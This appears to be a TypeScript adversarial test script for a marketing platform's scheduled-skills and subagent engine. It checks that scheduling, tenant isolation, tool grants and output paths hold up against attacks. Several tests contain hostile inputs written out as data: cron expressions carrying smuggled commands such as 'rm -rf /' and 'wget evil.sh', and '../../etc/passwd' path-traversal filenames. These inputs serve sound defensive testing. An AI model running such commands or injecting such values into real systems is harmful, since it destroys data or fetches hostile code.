// Marketr Phase B (W2) — adversarial battery for the scheduled-skills +
// parallel-subagents engine (lib/scheduler).
//
// Run: npx tsx scripts/verify-scheduler.mts
// Run it three times before declaring stability.
//
// No live database, no network, no LLM: Prisma is faked in-memory, the
// output store is a memory seam, and the agent loop is the deterministic
// mock executor. Threat-model coverage:
//   T1 self-triggering event / runaway loops
//   T2 cron-expression injection
//   T3 unauthorized schedule create/edit (defense-in-depth workspace scoping)
//   T4 subagent privilege escalation (grant envelope)
//   T5 event-payload spoofing
//   T6 missed-cron stampede
//   T7 concurrency-cap bypass
//   T8 cross-workspace schedule enumeration
//   T9 supervised trust-ladder bypass
//   T10 output-path traversal / cross-tenant writes

import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
const HERE = dirname(fileURLToPath(import.meta.url));
import {
  parseCron,
  CronParseError,
  nextRunAfter,
  cronMatches,
} from "@/lib/scheduler/cron";
import {
  isEventSource,
  validateEventPayload,
  validateEventConfig,
  shouldFire,
  EVENT_SOURCE_CATALOG,
} from "@/lib/scheduler/events";
import {
  checkCycle,
  checkRateLimit,
  clampConcurrency,
  effectiveConcurrency,
  DEFAULT_CONCURRENCY,
  CONCURRENCY_CEILING,
  DEFAULT_MAX_RUNS_PER_HOUR,
} from "@/lib/scheduler/guard";
import {
  createSchedule,
  updateSchedule,
  deleteSchedule,
  fireSchedule,
  approveRun,
  rejectRun,
  triggerManual,
  injectEvent,
  ScheduleServiceError,
} from "@/lib/scheduler/service";
import { runSchedulerTick } from "@/lib/scheduler/tick";
import { runOutputPath, setOutputStore, type SchedulerOutputStore } from "@/lib/scheduler/outputStore";
import { executeSkillRun, runWithLimit } from "@/lib/scheduler/runner";

// ---------------------------------------------------------------- fake db

type Row = Record<string, any>;

function dateOf(v: any): number {
  return v instanceof Date ? v.getTime() : Number(v);
}

function matches(row: Row, where: Record<string, any>): boolean {
  for (const [key, cond] of Object.entries(where ?? {})) {
    const rv = row[key];
    if (cond !== null && typeof cond === "object" && !(cond instanceof Date) && !Array.isArray(cond)) {
      const ops = ["lte", "gte", "gt", "lt", "not", "in", "equals"];
      const isOp = Object.keys(cond).some((k) => ops.includes(k));
      if (isOp) {
        if ("lte" in cond && !(dateOf(rv) <= dateOf(cond.lte))) return false;
        if ("gte" in cond && !(dateOf(rv) >= dateOf(cond.gte))) return false;
        if ("gt" in cond && !(dateOf(rv) > dateOf(cond.gt))) return false;
        if ("lt" in cond && !(dateOf(rv) < dateOf(cond.lt))) return false;
        if ("not" in cond && dateOf(rv) === dateOf(cond.not)) return false;
        if ("equals" in cond && rv !== cond.equals) return false;
        if ("in" in cond && !cond.in.includes(rv)) return false;
      } else {
        // Nested relation filter (only shape used: subagentRun → skillRun).
        const nested: Row | undefined =
          key === "skillRun" ? tables.skillRun.find((r) => r.id === row.skillRunId) : undefined;
        if (!nested || !matches(nested, cond)) return false;
      }
    } else if (cond instanceof Date) {
      if (!(rv instanceof Date) || rv.getTime() !== cond.getTime()) return false;
    } else {
      if (rv !== cond) return false;
    }
  }
  return true;
}

const tables: Record<string, Row[]> = {};
let seq = 0;
const nid = (p: string) => `${p}_${++seq}`;

function makeModel(name: string) {
  const rows = () => (tables[name] ??= []);
  return {
    findFirst: async (args: { where?: any; include?: any } = {}) => {
      const r = rows().find((x) => matches(x, args.where)) ?? null;
      return r ? attach(r, args.include) : null;
    },
    findMany: async (args: { where?: any; take?: number; orderBy?: any; include?: any } = {}) => {
      let out = rows().filter((r) => matches(r, args.where));
      if (args.orderBy) {
        const [k, dir] = Object.entries(args.orderBy)[0] as [string, string];
        out = [...out].sort((a, b) => (dir === "desc" ? dateOf(b[k]) - dateOf(a[k]) : dateOf(a[k]) - dateOf(b[k])));
      }
      out = args.take != null ? out.slice(0, args.take) : out;
      return out.map((r) => attach(r, args.include));
    },
    findUnique: async (args: { where: any; include?: any }) => {
      const r = rows().find((x) => matches(x, args.where)) ?? null;
      if (!r) return null;
      return attach(r, args.include);
    },
    create: async (args: { data: Row }) => {
      const r: Row = { id: nid(name), ...args.data };
      rows().push(r);
      return attach(r, undefined);
    },
    update: async (args: { where: any; data: Row }) => {
      const r = rows().find((x) => matches(x, args.where));
      if (!r) throw new Error(`row not found in ${name}`);
      Object.assign(r, args.data);
      return r;
    },
    updateMany: async (args: { where: any; data: Row }) => {
      let count = 0;
      for (const r of rows()) {
        if (matches(r, args.where)) {
          Object.assign(r, args.data);
          count++;
        }
      }
      return { count };
    },
    delete: async (args: { where: any }) => {
      const i = rows().findIndex((x) => matches(x, args.where));
      if (i < 0) throw new Error(`row not found in ${name}`);
      const [r] = rows().splice(i, 1);
      return r;
    },
    count: async (args: { where?: any } = {}) => rows().filter((r) => matches(r, args.where)).length,
  };
}

function attach(r: Row, include: any): Row {
  if (!include) return { ...r };
  const out = { ...r };
  if (include.skill) out.skill = tables.skill.find((s) => s.id === r.skillId) ?? null;
  if (include.schedule) out.schedule = tables.scheduledSkill.find((s) => s.id === r.scheduleId) ?? null;
  return out;
}

function seed() {
  for (const k of Object.keys(tables)) tables[k] = [];
  seq = 0;
  tables.skill = [
    {
      id: "skill_audit",
      workspaceId: "wsA",
      name: "SEO Audit",
      slug: "seo-audit",
      declaredTools: ["web_fetch", "keyword_lookup"],
    },
    {
      id: "skill_other_ws",
      workspaceId: "wsB",
      name: "Other Workspace Skill",
      slug: "rank-tracker",
      declaredTools: [],
    },
  ];
  tables.project = [
    { id: "projA", workspaceId: "wsA" },
    { id: "projB", workspaceId: "wsB" },
  ];
  tables.projectSkill = [{ id: "psA", projectId: "projA", skillId: "skill_audit", enabled: true }];
}

const db: any = {
  skill: makeModel("skill"),
  project: makeModel("project"),
  projectSkill: makeModel("projectSkill"),
  scheduledSkill: makeModel("scheduledSkill"),
  skillRun: makeModel("skillRun"),
  subagentRun: makeModel("subagentRun"),
  fileChangeLog: {
    create: async (args: { data: Row }) => {
      const r = { id: nid("audit"), ...args.data };
      (tables.fileChangeLog ??= []).push(r);
      return r;
    },
  },
};

function audits(action: string): Row[] {
  return (tables.fileChangeLog ?? []).filter((a) => a.action === action);
}

// Memory output store: reports stay in-process, never touch the sibling
// filesystem track or the local fallback dir.
const reports = new Map<string, string>();
const memoryStore: SchedulerOutputStore = {
  async writeReport(workspaceId, runId, filename, content) {
    const logicalPath = runOutputPath(runId, filename);
    reports.set(`${workspaceId}:${logicalPath}`, content);
    return { logicalPath };
  },
  async readReport(workspaceId, logicalPath) {
    return reports.get(`${workspaceId}:${logicalPath}`) ?? null;
  },
};
setOutputStore(memoryStore);

// ---------------------------------------------------------------- harness

let passed = 0;
let failed = 0;
const failures: string[] = [];
function check(name: string, cond: boolean, detail = ""): void {
  if (cond) {
    passed++;
  } else {
    failed++;
    failures.push(`${name}${detail ? ` — ${detail}` : ""}`);
  }
}

async function expectThrow(name: string, fn: () => Promise<unknown> | unknown, needle = ""): Promise<void> {
  try {
    await fn();
    check(name, false, "expected a throw, got success");
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    check(name, needle === "" || msg.includes(needle), `threw "${msg}", wanted "${needle}"`);
  }
}

const NOW = new Date("2026-09-22T12:00:00.000Z");

// ================================================================ main
async function main() {
  seed();

  // ---------------- T2: cron injection ----------------
  await expectThrow("T2: command-injection cron rejected", () => createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 9 * * *; rm -rf /", createdBy: "u1", approvalMode: "scheduled",
  }), "cron");
  await expectThrow("T2: six-field cron rejected", () => createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 9 * * * *", createdBy: "u1", approvalMode: "scheduled",
  }), "cron");
  await expectThrow("T2: alphabetic cron rejected", () => createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "abc def * * *", createdBy: "u1", approvalMode: "scheduled",
  }), "cron");
  await expectThrow("T2: four-field cron rejected", () => createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 9 * *", createdBy: "u1", approvalMode: "scheduled",
  }), "cron");
  await expectThrow("T2: out-of-range hour rejected", () => createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 25 * * *", createdBy: "u1", approvalMode: "scheduled",
  }), "out of range");
  await expectThrow("T2: updateSchedule cron injection rejected", async () => {
    const s = await createSchedule(db, {
      workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
      cronExpr: "0 9 * * *", createdBy: "u1", approvalMode: "scheduled",
    }, NOW);
    await updateSchedule(db, s.id, "wsA", { cronExpr: "0 9 * * * || wget evil.sh" }, "u1", NOW);
  });
  const legit = await createSchedule(db, {
    workspaceId: "wsA", projectId: "projA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 9 * * 1", createdBy: "u1", approvalMode: "scheduled",
  }, NOW);
  check("T2: valid cron accepted", legit.cronExpr === "0 9 * * 1" && legit.nextRunAt instanceof Date, JSON.stringify(legit.nextRunAt));
  check("T2: next run lands on a future Monday 09:00", (() => {
    if (!(legit.nextRunAt instanceof Date)) return false;
    const d = legit.nextRunAt;
    return d.getUTCDay() === 1 && d.getUTCHours() === 9 && d.getTime() > NOW.getTime();
  })());
  check("T2: CronParseError is the thrown type", (() => {
    try { parseCron("nope"); } catch (e) { return e instanceof CronParseError; }
    return false;
  })());
  check("T2: cronMatches sanity", cronMatches(parseCron("0 9 * * *"), new Date("2026-09-23T09:00:00Z")));
  check("T2: skill not enabled for project is refused", await (async () => {
    tables.skill.push({ id: "skill_disabled", workspaceId: "wsA", name: "Disabled", slug: "rank-tracker", declaredTools: [] });
    try {
      await createSchedule(db, {
        workspaceId: "wsA", projectId: "projA", skillId: "skill_disabled", triggerType: "cron",
        cronExpr: "0 9 * * *", createdBy: "u1", approvalMode: "scheduled",
      }, NOW);
      return false;
    } catch (err) {
      return err instanceof ScheduleServiceError && /not enabled for this project/.test(err.message);
    }
  })());

  // ---------------- T1: self-triggering event / runaway loops ----------------
  const selfTrig = await createSchedule(db, {
    workspaceId: "wsA", projectId: "projA", skillId: "skill_audit", triggerType: "event",
    eventSource: "content_published", eventConfig: {}, createdBy: "u1", approvalMode: "scheduled",
  }, NOW);
  const beforeRuns = (await db.skillRun.count({})).valueOf() as number;
  const selfFire = await fireSchedule(db, selfTrig, {
    trigger: "event", lineage: [selfTrig.id], eventPayload: { id: "c1" }, actorId: "u1", now: NOW,
  });
  check("T1: self-trigger in lineage is blocked", selfFire.fired === false && !!selfFire.blockedReason?.includes("lineage"), JSON.stringify(selfFire));
  check("T1: blocked self-trigger creates no run", (await db.skillRun.count({})) === beforeRuns);
  check("T1: cycle is audited", audits("scheduler_cycle_blocked").length >= 1);
  const viaEvent = await injectEvent(db, {
    workspaceId: "wsA", projectId: "projA", source: "content_published",
    payload: { url: "https://example.com/published-2" }, lineage: [selfTrig.id], actorId: "u1", now: NOW,
  });
  check("T1: injectEvent with schedule in lineage is skipped, not fired",
    viaEvent.accepted === true && viaEvent.fired.length === 0 && viaEvent.skipped.some((s: any) => s.reason.includes("lineage")),
    JSON.stringify(viaEvent.skipped));
  check("T1: checkCycle pure helper", !checkCycle([selfTrig.id], selfTrig.id).allowed && checkCycle(["other"], selfTrig.id).allowed);

  // ---------------- T3/T8: cross-workspace defense-in-depth ----------------
  await expectThrow("T8: schedule can't use another workspace's skill", () => createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_other_ws", triggerType: "cron",
    cronExpr: "0 9 * * *", createdBy: "u1",
  }, NOW), "not found in workspace");
  await expectThrow("T8: schedule can't attach another workspace's project", () => createSchedule(db, {
    workspaceId: "wsA", projectId: "projB", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 9 * * *", createdBy: "u1",
  }, NOW), "not found in workspace");
  await expectThrow("T8: updateSchedule is workspace-scoped (enumeration → not found)", () =>
    updateSchedule(db, legit.id, "wsB", { concurrencyLimit: 8 }, "u1", NOW), "schedule not found");
  await expectThrow("T8: deleteSchedule is workspace-scoped", () =>
    deleteSchedule(db, legit.id, "wsB", "u1"), "schedule not found");
  await expectThrow("T8: updateSchedule on unknown id → not found", () =>
    updateSchedule(db, "sched_nope", "wsA", { concurrencyLimit: 8 }, "u1", NOW), "schedule not found");
  await expectThrow("T8: approveRun is workspace-scoped", () =>
    approveRun(db, "run_nope", "wsB", "u1"), "run not found");

  const otherWsSched = await createSchedule(db, {
    workspaceId: "wsB", skillId: "skill_other_ws", triggerType: "event",
    eventSource: "rank_drop", eventConfig: { dropThreshold: 3 }, createdBy: "u1", approvalMode: "scheduled",
  }, NOW);
  const crossEvent = await injectEvent(db, {
    workspaceId: "wsA", projectId: "projA", source: "rank_drop",
    payload: { domain: "example.com", keyword: "seo tools", previousRank: 2, currentRank: 9 }, actorId: "u1", now: NOW,
  });
  check("T8: event in wsA never fires wsB's schedule",
    crossEvent.fired.every((f: any) => f.scheduleId !== otherWsSched.id), JSON.stringify(crossEvent.fired.map((f: any) => f.scheduleId)));
  const wrongProj = await injectEvent(db, {
    workspaceId: "wsA", projectId: "projB", source: "content_published",
    payload: { id: "c3" }, actorId: "u1", now: NOW,
  });
  check("T8: event for another workspace's project is rejected", wrongProj.accepted === false);

  // ---------------- T9: supervised trust ladder ----------------
  const supSched = await createSchedule(db, {
    workspaceId: "wsA", projectId: "projA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 10 * * *", createdBy: "u1", approvalMode: "supervised",
  }, NOW);
  const subBefore = await db.subagentRun.count({});
  const prop = await triggerManual(db, supSched.id, "wsA", "u1", { now: NOW });
  check("T9: supervised manual trigger holds for approval", prop.fired === true && prop.awaitingApproval === true && !!prop.runId);
  const held = await db.skillRun.findFirst({ where: { id: prop.runId } });
  check("T9: held run executes nothing (no subagents, no output)",
    held.status === "awaiting_approval" && held.outputPath == null && (await db.subagentRun.count({})) === subBefore,
    `status=${held.status}`);
  check("T9: proposal is audited", audits("scheduler_run_proposed").length >= 1);
  await expectThrow("T9: cannot approve a non-awaiting run", async () => {
    await approveRun(db, held.id, "wsA", "u1");
    await approveRun(db, held.id, "wsA", "u1"); // second approval: already running/approved
  }, "not awaiting approval");
  const held2 = await triggerManual(db, supSched.id, "wsA", "u1", { now: NOW });
  await rejectRun(db, held2.runId!, "wsA", "u1");
  const rej = await db.skillRun.findFirst({ where: { id: held2.runId } });
  check("T9: rejected run never executes", rej.status === "rejected" && (await db.subagentRun.count({ where: { skillRunId: held2.runId } })) === 0);

  // ---------------- T4: subagent grant envelope ----------------
  const grantSched = await createSchedule(db, {
    workspaceId: "wsA", projectId: "projA", skillId: "skill_audit", triggerType: "manual" as any,
    cronExpr: null, createdBy: "u1", approvalMode: "scheduled",
  } as any, NOW).catch(() => null);
  check("T4: bogus triggerType rejected", grantSched === null);
  const runRow = await db.skillRun.create({
    data: {
      scheduleId: null, workspaceId: "wsA", projectId: "projA", skillId: "skill_audit",
      trigger: "manual", status: "pending", startedAt: NOW, lineage: [],
    },
  });
  const toolsAuditsBefore = audits("connector_tool_denied").length;
  await executeSkillRun(db, runRow.id, {
    subtasks: [
      { label: "allowed analysis", tool: "web_fetch", detail: "ok" },
      { label: "escalation attempt", tool: "shell_exec", detail: "not declared" },
      { label: "pure analysis", tool: null, detail: "ok" },
    ],
  });
  const subs = await db.subagentRun.findMany({ where: { skillRunId: runRow.id } });
  const skipped = subs.find((s: Row) => s.taskLabel === "escalation attempt");
  const allowed = subs.find((s: Row) => s.taskLabel === "allowed analysis");
  check("T4: undeclared tool is skipped with zero credits",
    skipped?.status === "skipped" && skipped?.creditsUsed === 0 && skipped?.result == null,
    JSON.stringify(skipped));
  check("T4: declared tool executes", allowed?.status === "succeeded" && (allowed?.creditsUsed ?? 0) > 0);
  check("T4: denial is audited", audits("connector_tool_denied").length === toolsAuditsBefore + 1);
  const doneRun = await db.skillRun.findFirst({ where: { id: runRow.id } });
  check("T4: run still succeeds overall with report written",
    doneRun.status === "succeeded" && !!doneRun.outputPath && reports.has(`wsA:${doneRun.outputPath}`));
  check("T4: run is credit-metered", doneRun.creditsUsed > 0);

  // ---------------- T7: concurrency cap ----------------
  check("T7: effectiveConcurrency clamps schedule over ceiling", effectiveConcurrency(99, 99) === CONCURRENCY_CEILING);
  check("T7: effectiveConcurrency takes the min of schedule/workspace", effectiveConcurrency(2, 8) === 2 && effectiveConcurrency(8, 2) === 2);
  check("T7: effectiveConcurrency defaults to workspace default 4", effectiveConcurrency(16, DEFAULT_CONCURRENCY) === 4);
  await expectThrow("T7: non-integer concurrency rejected", () => createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 11 * * *", createdBy: "u1", approvalMode: "scheduled", concurrencyLimit: 2.5,
  }, NOW), "integer");
  const clamped = await createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 12 * * *", createdBy: "u1", approvalMode: "scheduled", concurrencyLimit: 500,
  }, NOW);
  check("T7: schedule concurrencyLimit clamped to 16", clamped.concurrencyLimit === 16);
  let inFlight = 0;
  let maxInFlight = 0;
  await runWithLimit([1, 2, 3, 4, 5, 6, 7, 8], 2, async (i) => {
    inFlight++;
    maxInFlight = Math.max(maxInFlight, inFlight);
    await new Promise((r) => setTimeout(r, 5));
    inFlight--;
    return i;
  });
  check("T7: runWithLimit never exceeds the cap", maxInFlight <= 2, `maxInFlight=${maxInFlight}`);
  check("T7: clampConcurrency floor/ceiling", clampConcurrency(0) === 1 && clampConcurrency(16) === 16 && clampConcurrency(-3) === 1);
  // Cross-run guard: a sibling running run's active subagents count against the cap.
  const sibRun = await db.skillRun.create({
    data: { scheduleId: clamped.id, workspaceId: "wsA", projectId: null, skillId: "skill_audit", trigger: "cron", status: "running", startedAt: NOW, lineage: [clamped.id] },
  });
  await db.subagentRun.create({ data: { skillRunId: sibRun.id, taskLabel: "sibling work", status: "running" } });
  const { effectiveConcurrency: eff } = await import("@/lib/scheduler/guard");
  const activeElsewhere = await db.subagentRun.count({
    where: { status: "running", skillRun: { scheduleId: clamped.id, id: { not: "this_run" }, status: "running" } },
  });
  check("T7: active subagents of sibling runs are counted", activeElsewhere === 1 && eff(clamped.concurrencyLimit, DEFAULT_CONCURRENCY) - activeElsewhere === 3);

  // ---------------- T6: missed-cron stampede ----------------
  const missedSched = await createSchedule(db, {
    workspaceId: "wsA", projectId: "projA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 * * * *", createdBy: "u1", approvalMode: "scheduled",
  }, NOW);
  // Simulate 2h of downtime: nextRunAt fell behind the grace window.
  await db.scheduledSkill.update({
    where: { id: missedSched.id },
    data: { nextRunAt: new Date(NOW.getTime() - 2 * 3_600_000) },
  });
  const runsBefore = await db.skillRun.count({ where: { scheduleId: missedSched.id } });
  const tick1 = await runSchedulerTick(db, NOW, { workspaceId: "wsA" });
  const afterTick = await db.scheduledSkill.findFirst({ where: { id: missedSched.id } });
  const runsAfter = await db.skillRun.count({ where: { scheduleId: missedSched.id } });
  const onlyRun = await db.skillRun.findFirst({ where: { scheduleId: missedSched.id } });
  check("T6: missed cron fires exactly once", tick1.missed === 1 && tick1.fired === 1 && runsAfter === runsBefore + 1,
    JSON.stringify({ missed: tick1.missed, fired: tick1.fired, runsBefore, runsAfter }));
  check("T6: missed run is marked missed", onlyRun?.wasMissed === true);
  check("T6: nextRunAt jumps to a future slot (no bulk replay)", (afterTick.nextRunAt as Date).getTime() > NOW.getTime());
  check("T6: miss is audited", audits("scheduler_run_missed").length >= 1);
  const tick2 = await runSchedulerTick(db, NOW, { workspaceId: "wsA" });
  check("T6: immediate re-tick does not double-fire", tick2.claimed === 0 && tick2.fired === 0 &&
    (await db.skillRun.count({ where: { scheduleId: missedSched.id } })) === runsAfter);
  // Atomic claim: a lost race (updateMany matched 0 rows) must not fire.
  const raceSched = await createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "cron",
    cronExpr: "0 13 * * *", createdBy: "u1", approvalMode: "scheduled",
  }, NOW);
  await db.scheduledSkill.update({ where: { id: raceSched.id }, data: { nextRunAt: new Date(NOW.getTime() - 1000) } });
  const raceRunsBefore = await db.skillRun.count({ where: { scheduleId: raceSched.id } });
  const losingDb: any = { ...db, scheduledSkill: { ...db.scheduledSkill, updateMany: async () => ({ count: 0 }) } };
  const raceTick = await runSchedulerTick(losingDb, NOW, { workspaceId: "wsA" });
  check("T6: lost claim race fires nothing", raceTick.fired === 0 && raceTick.claimed === 0 &&
    (await db.skillRun.count({ where: { scheduleId: raceSched.id } })) === raceRunsBefore);

  // ---------------- rate limiting (T1 guard) ----------------
  const rlSched = await createSchedule(db, {
    workspaceId: "wsA", skillId: "skill_audit", triggerType: "event",
    eventSource: "content_published", eventConfig: {}, createdBy: "u1", approvalMode: "scheduled",
  }, NOW);
  for (let i = 0; i < DEFAULT_MAX_RUNS_PER_HOUR; i++) {
    await db.skillRun.create({
      data: {
        scheduleId: rlSched.id, workspaceId: "wsA", projectId: null, skillId: "skill_audit",
        trigger: "event", status: "succeeded", startedAt: new Date(NOW.getTime() - i * 60_000), lineage: [rlSched.id],
      },
    });
  }
  const rlRunsBefore = await db.skillRun.count({ where: { scheduleId: rlSched.id } });
  const rlFire = await fireSchedule(db, rlSched, { trigger: "event", lineage: [], now: NOW });
  check("T1: max-runs-per-hour drops the firing", rlFire.fired === false && !!rlFire.blockedReason?.includes("trailing hour"), JSON.stringify(rlFire));
  check("T1: dropped firing creates no run", (await db.skillRun.count({ where: { scheduleId: rlSched.id } })) === rlRunsBefore);
  check("T1: rate-limit check under the cap allows", (await checkRateLimit(db, legit.id, NOW)).allowed === true);

  // ---------------- T5: event-payload spoofing ----------------
  const unk = await injectEvent(db, { workspaceId: "wsA", source: "free_money", payload: { id: "x" }, now: NOW });
  check("T5: unknown event source rejected", unk.accepted === false && (unk.error ?? "").includes("unknown event source"));
  const badPayload = await injectEvent(db, {
    workspaceId: "wsA", projectId: "projA", source: "rank_drop", payload: { keyword: "seo tools" }, now: NOW,
  });
  check("T5: malformed payload rejected", badPayload.accepted === false && (badPayload.error ?? "").includes("failed validation"));
  check("T5: payload validators exist per source", EVENT_SOURCE_CATALOG.length === 5 &&
    validateEventPayload("new_backlink", { domain: "x.example", fromUrl: "https://a.example/p", toUrl: "https://x.example/p" }) !== null &&
    validateEventPayload("new_backlink", { url: "not a url" }) === null &&
    validateEventConfig("rank_drop", { dropThreshold: 5 }) !== null &&
    validateEventConfig("rank_drop", { dropThreshold: "lots" }) === null);
  check("T5: isEventSource gate", isEventSource("rank_drop") && !isEventSource("../../../etc/passwd"));
  const subThreshold = await injectEvent(db, {
    workspaceId: "wsA", projectId: "projA", source: "rank_drop",
    payload: { domain: "example.com", keyword: "seo tools", previousRank: 3, currentRank: 4 }, now: NOW, actorId: "u1",
  });
  check("T5: below-threshold drop does not fire", subThreshold.accepted === true && subThreshold.fired.length === 0,
    JSON.stringify(subThreshold.skipped));
  check("T5: shouldFire threshold boundary", shouldFire("rank_drop", { dropThreshold: 3 }, { domain: "example.com", keyword: "k", previousRank: 1, currentRank: 4 } as any) === true);
  // Project-scoped schedule must not fire for another project's event.
  const projScoped = await createSchedule(db, {
    workspaceId: "wsA", projectId: "projA", skillId: "skill_audit", triggerType: "event",
    eventSource: "content_published", eventConfig: {}, createdBy: "u1", approvalMode: "scheduled",
  }, NOW);
  const otherProjEvent = await injectEvent(db, {
    workspaceId: "wsA", source: "content_published", payload: { url: "https://example.com/other" }, now: NOW, actorId: "u1",
  });
  check("T5/T8: project-scoped schedule skips other-project events",
    otherProjEvent.fired.every((f: any) => f.scheduleId !== projScoped.id) &&
    otherProjEvent.skipped.some((s: any) => s.scheduleId === projScoped.id && s.reason.includes("different project")));

  // ---------------- T10: output-path traversal ----------------
  const trav = runOutputPath("run_1", "../../etc/passwd");
  check("T10: traversal in filename is neutralized",
    trav === "/artifacts/runs/run_1/.._.._etc_passwd" && !trav.includes("../"),
    trav);
  const trav2 = runOutputPath("run_1", "a/b\\c:d*e?f\"g<h>i|j");
  check("T10: hostile chars are sanitized", !/[\/\\:?"<>|]/.test(trav2.replace("/artifacts/runs/run_1/", "")), trav2);
  const trav3 = runOutputPath("run_1", "");
  check("T10: empty filename falls back to report.md", trav3 === "/artifacts/runs/run_1/report.md");
  check("T10: run dirs are isolated per run",
    runOutputPath("run_A", "report.md") !== runOutputPath("run_B", "report.md"));
  check("T10: memory store is workspace-keyed",
    reports.has(`wsA:${runOutputPath(runRow.id, "report.md")}`) &&
    !reports.has(`wsB:${runOutputPath(runRow.id, "report.md")}`));

  // ---------------- migration static check ----------------
  const mig = readFileSync(join(HERE, "..", "prisma", "migrations", "20260922200000_scheduler_subagents", "migration.sql"), "utf8");
  check("MIG: SkillRunStatus enum includes 'approved'",
    /CREATE TYPE "SkillRunStatus" AS ENUM \([^)]*'approved'/.test(mig));

  // ---------------- summary ----------------
  console.log(`\nverify-scheduler: ${passed} passed, ${failed} failed`);
  if (failures.length > 0) {
    console.log("FAILURES:");
    for (const f of failures) console.log(`  - ${f}`);
    process.exit(1);
  }
}

main().catch((err) => {
  console.error("verify-scheduler crashed:", err);
  process.exit(1);
});
